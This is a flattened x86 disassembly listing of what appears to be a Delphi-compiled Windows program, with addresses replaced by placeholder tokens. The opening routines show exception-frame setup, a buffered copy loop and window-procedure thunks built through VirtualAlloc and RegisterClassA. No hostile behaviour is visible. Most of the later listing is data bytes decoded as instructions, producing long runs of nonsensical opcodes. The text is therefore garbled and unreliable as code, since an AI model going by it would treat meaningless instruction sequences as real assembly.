pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41f408
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405944
xor eax eax
push ebp
push sub_41f5f5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41f5ce
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026dc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41f5bd
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026fc
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_4039a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5fc
lea eax [ ebp + 0xc ]
call sub_4058d0
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_4039a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41f638
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41f69b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41f6cc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_418258
mov edi eax
xor eax eax
push ebp
push sub_41f721
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f728
mov eax [ rw-data ]
call sub_4182bc
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_417e94
call sub_40316c
inc esi
dec ebx
jne r-xdata
sub_41f740
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41f768
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028d8
mov edx sub_41f740
lea eax [ esi + 0x5 ]
call sub_41f760
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41f760
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41f824
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406d1c
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41f768
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41f8d8
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41f800
sub_41f900
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41f9a4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f9ab
retn
mov eax [ rw-data ]
call sub_417684
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41f6cc
xor edx edx
xor eax eax
call sub_41b344
mov eax rw-data
call sub_40d3ac
call sub_406000
lea eax [ eax + 0xc ]
call sub_40d3ac
mov eax rw-data
call sub_40d3ac
mov eax rw-data
call sub_4058d0
mov eax sub_41f738
call sub_40576c
mov eax rw-data
call sub_40d3ac
call sub_41df40
mov eax rw-data
call sub_40d3ac
mov eax rw-data
call sub_4058d0
sub_41f9b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41fa39
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa40
retn
call sub_41df0c
mov eax sub_41f738
call sub_405764
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d0ec
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4058e8
mov dl 0x1
mov eax [ r-xdata ]
call sub_416f80
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418100
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418100
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41fa44
xchg esi eax
dec eax
add [ ecx - 0x1 ] dh
add [ eax ] al
xchg esi eax
dec eax
add [ edx - 0x1 ] dh
add [ eax ] al
xchg esi eax
dec eax
add [ ebx - 0x1 ] dh
add [ eax ] al
xchg esi eax
dec eax
add [ edi + edi * 8 ] dh
add [ esi + edx * 4 + 0x48 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
xchg esi eax
dec eax
add [ esi - 0x1 ] dh
add [ eax ] al
xchg esi eax
dec eax
add [ edi - 0x1 ] dh
add [ eax ] al
xchg esi eax
dec eax
add [ eax - 0x1 ] bh
add [ eax ] al
xchg esi eax
dec eax
add [ ecx - 0x1 ] bh
add [ eax ] al
xchg esi eax
dec eax
add [ edx - 0x1 ] bh
add [ eax ] al
xchg esi eax
dec eax
add [ ebx - 0x1 ] bh
add [ eax ] al
xchg esi eax
dec eax
add [ edi + edi * 8 ] bh
add [ esi + edx * 4 + 0x48 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
xchg esi eax
dec eax
add [ esi - 0x1 ] bh
add [ eax ] al
xchg esi eax
dec eax
add [ edi - 0x1 ] bh
add [ eax ] al
xchg esi eax
dec eax
add [ eax - 0x1 ] ah
add [ eax ] al
xchg esi eax
dec eax
add [ ecx - 0x1 ] ah
add [ eax ] al
xchg esi eax
dec eax
add [ edx - 0x1 ] ah
add [ eax ] al
xchg esi eax
dec eax
add [ ebx - 0x1 ] ah
add [ eax ] al
xchg esi eax
dec eax
add [ edi + edi * 8 ] ah
add [ esi + edx * 4 + 0x48 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
xchg esi eax
dec eax
add [ esi - 0x1 ] ah
add [ eax ] al
xchg esi eax
dec eax
add [ edi - 0x1 ] ah
add [ eax ] al
xchg esi eax
dec eax
add [ eax - 0x1 ] ch
add [ eax ] al
xchg esi eax
dec eax
add [ ecx - 0x1 ] ch
add [ eax ] al
xchg esi eax
dec eax
add [ edx - 0x1 ] ch
add [ eax ] al
xchg esi eax
dec eax
add [ ebx - 0x1 ] ch
add [ eax ] al
xchg esi eax
dec eax
add [ edi + edi * 8 ] ch
add [ esi + edx * 4 + 0x48 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
xchg esi eax
dec eax
add [ esi - 0x1 ] ch
add [ eax ] al
xchg esi eax
dec eax
add [ edi - 0x1 ] ch
add [ eax ] al
xchg esi eax
dec eax
add [ eax - 0x1 ] dl
add [ eax ] al
xchg esi eax
dec eax
add [ ecx - 0x1 ] dl
add [ eax ] al
xchg esi eax
dec eax
add [ edx - 0x1 ] dl
add [ eax ] al
xchg esi eax
dec eax
add [ ebx - 0x1 ] dl
add [ eax ] al
xchg esi eax
dec eax
add [ edi + edi * 8 ] dl
add [ esi + edx * 4 + 0x48 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
xchg esi eax
dec eax
add [ esi - 0x1 ] dl
add [ eax ] al
xchg esi eax
dec eax
add [ edi - 0x1 ] dl
add [ eax ] al
xchg esi eax
dec eax
add [ eax - 0x1 ] bl
add [ eax ] al
xchg esi eax
dec eax
add [ ecx - 0x1 ] bl
add [ eax ] al
xchg esi eax
dec eax
add [ edx - 0x1 ] bl
add [ eax ] al
xchg esi eax
dec eax
add [ ebx - 0x1 ] bl
add [ eax ] al
xchg esi eax
dec eax
add [ edi + edi * 8 ] bl
add [ esi + edx * 4 + 0x48 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
xchg esi eax
dec eax
add [ esi - 0x1 ] bl
add [ eax ] al
xchg esi eax
dec eax
add [ edi - 0x1 ] bl
add [ eax ] al
xchg esi eax
dec eax
add [ eax - 0x1 ] al
add [ eax ] al
xchg esi eax
dec eax
add [ ecx - 0x1 ] al
add [ eax ] al
xchg esi eax
dec eax
add [ edx - 0x1 ] al
add [ eax ] al
xchg esi eax
dec eax
add [ ebx - 0x1 ] al
add [ eax ] al
xchg esi eax
dec eax
add [ edi + edi * 8 ] al
add [ esi + edx * 4 + 0x48 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
xchg esi eax
dec eax
add [ esi - 0x1 ] al
add [ eax ] al
xchg esi eax
dec eax
add [ edi - 0x1 ] al
add [ eax ] al
xchg esi eax
dec eax
add [ eax - 0x1 ] cl
add [ eax ] al
xchg esi eax
dec eax
add [ ecx - 0x1 ] cl
add [ eax ] al
xchg esi eax
dec eax
add [ edx - 0x1 ] cl
add [ eax ] al
xchg esi eax
dec eax
add [ ebx - 0x1 ] cl
add [ eax ] al
xchg esi eax
dec eax
add [ edi + edi * 8 ] cl
add [ esi + edx * 4 + 0x48 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
xchg esi eax
dec eax
add [ esi - 0x1 ] cl
add [ eax ] al
xchg esi eax
dec eax
add [ edi - 0x1 ] cl
add [ eax ] al
xchg esi eax
dec eax
add [ eax ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
xchg esi eax
dec eax
add [ 0x640000ff ] dh
xchg esi eax
dec eax
add [ esi ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
xchg esi eax
dec eax
add [ 0x640000ff ] bh
xchg esi eax
dec eax
add [ esi ] bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edx ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ebx ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi + edi * 8 ] ah
add [ eax ] al
xchg esi eax
dec eax
add [ 0x640000ff ] ah
xchg esi eax
dec eax
add [ esi ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
xchg esi eax
dec eax
add [ 0x640000ff ] ch
xchg esi eax
dec eax
add [ esi ] ch
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi ] ch
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_41fd61
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fd68
retn
sub_41fd76
inc ecx
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
fdivr st5
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
std
inc ecx
add [ eax + eax ] cl
add [ eax ] al
dec esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 8 ] dh
inc ecx
add [ eax + eax ] cl
add [ eax ] al
dec esp
jb r-xdata
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ esi + edi * 8 ] si
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ eax - 0x2 ] dl
inc ecx
add [ ecx ] cl
jo r-xdata
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
jb r-xdata
push 0x65737261
je r-xdata
popa
jne r-xdata
jae r-xdata
inc esi
popad
insd
nop
test al 0xfe
inc ecx
add [ ecx ] al
or al 0x54
je r-xdata
je r-xdata
outsb
je r-xdata
outsd
outsb
lea eax [ eax ]
push esp
inc [ ecx ]
add ecx [ edx ]
push esp
inc esi
outsd
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ eax + 0x70041ff ] dl
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
inc [ ecx ]
mov eax eax
sub al 0xff
inc ecx
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
sar dh 0x41
add [ ebx + 0x41ff2cc0 ] cl
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al al
inc [ ecx ]
push es
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
sar dh 0x41
add [ esi ] al
popad
jb r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xff14c08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax ] ch
inc [ ecx ]
pop es
jo r-xdata
outsd
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x41fe9890
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
pop es
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
cmp al 0x1
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41ff9490
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
add [ edx ] eax
sub [ ecx ] al
inc edx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
rcl [ eax ] 0x42
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
jo r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
add eax 0x6f4e6d70
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
jo r-xdata
push es
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
inc esp
outsd
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax + eax + 0x42 ] cl
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
dec ebp
push eax
outsb
insb
add ch bh
add [ ecx ] al
jae r-xdata
mov eax eax
push eax
add [ edx ] al
add ecx [ ebx ]
push esp
inc edx
jb r-xdata
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
inc eax
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
jl r-xdata
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc edx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x59 ] dl
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
jae r-xdata
dec ebp
popad
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
adc eax 0x540f0042
inc edi
jb r-xdata
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax ] bh
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ ebx ] al
imul esp [ ebx + 0x73 ] r--data
inc edx
add [ ebp + eax * 4 - 0x7a6bffbf ] cl
inc ecx
add [ eax + 0x1004184 ] ch
inc ecx
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ esp + eax * 4 + 0x41 ] bh
outsb
je r-xdata
dec ebp
jb r-xdata
outsb
jb r-xdata
adc al 0x1
or [ edi + 0x72 ] al
popad
jo r-xdata
nop
inc edi
outsd
popad
insb
dec esi
outsd
je r-xdata
add [ eax ] ch
add [ edx ] eax
sbb [ eax ] al
add [ eax ] al
push eax
pop ecx
insb
dec esi
outsd
or dh [ gs : eax + 0x6d ]
jo r-xdata
add [ eax ] al
add [ fs : edx ] eax
and [ eax ] al
add [ eax ] al
add [ eax ] eax
push [ eax + ebx + 0x54050042 ]
inc esi
outsd
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0xffff0001
nop
call sub_4243a2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
add [ edx ] eax
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + edi + 0x1 ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
popad
imul esp [ ebx + 0x73 ] 0x42011490
jo r-xdata
add al [ edx ]
pop es
add eax 0x6e6f4654
je r-xdata
sbb [ edx ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
add al [ edx ]
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + edx + 0x1 ] si
inc edx
add ah al
pop ecx
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
xchg esp eax
inc [ ecx ]
sbb al 0x1c
imul esp [ ebx + 0x73 ] 0xfea40007
inc ecx
add [ ebx + 0x1d3c0042 ] dh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
std
add [ edx ] eax
cmp [ ecx ] al
inc edx
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
push cs
add al [ edx ]
and al 0x0
add [ eax ] al
enter 0x4200 0x0
jo r-xdata
inc eax
add [ eax ] ah
xor [ eax ] eax
test al 0x1d
inc edx
add [ ebp + eax * 4 - 0x7a6bffbf ] cl
inc ecx
add al dl
sbb eax 0x54040042
adc bh bh
inc ecx
add ah cl
sbb al 0x42
add al bl
sbb al 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
add eax 0x63746950
push r-xdata
nop
sbb al 0x42
add [ esp + ebx + 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x69530400
jpe r-xdata
add [ eax ] al
add [ eax + eax ] al
std
inc ecx
add [ eax ] bl
add [ eax ] al
dec [ edx + ebx ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050001 ] al
outsd
insb
outsd
jb r-xdata
inc edx
add [ esp + ebx ] dh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
add al [ eax ]
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x41fe9474
add [ esp + ebx ] bl
mov ah 0x33
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax + ebx - 0x7a73ffbe ] cl
inc ecx
add [ ebp + eax * 4 + 0x18d00041 ] dl
inc edx
add [ edx ] al
imul esp [ ebx + 0x73 ] 0xc08b0000
push 0xf004201
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
add al 0x54
push eax
outsb
add eax [ fs : edx ]
cmp [ ecx ] al
inc edx
add [ eax + eax ] al
inc edx
add [ edi ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
insb
lea eax [ eax ]
add eax [ fs : edx ]
add [ eax ] al
